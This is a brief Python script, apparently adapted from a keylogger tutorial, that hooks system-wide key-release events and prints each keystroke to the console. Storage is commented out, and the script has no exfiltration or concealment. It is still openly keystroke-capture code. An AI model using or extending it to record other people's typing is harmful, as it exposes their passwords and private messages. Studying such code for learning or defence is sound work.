import keyboard  # pip install keyboard


class KeyLogger:
    def __init__(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)

        Credits: https://thepythoncode.com/article/write-a-keylogger-python
        """
        name = event.name
        print(event)
        if name is not None and len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        print(name)
        # self.log += name


if __name__ == '__main__':
    KeyLogger()
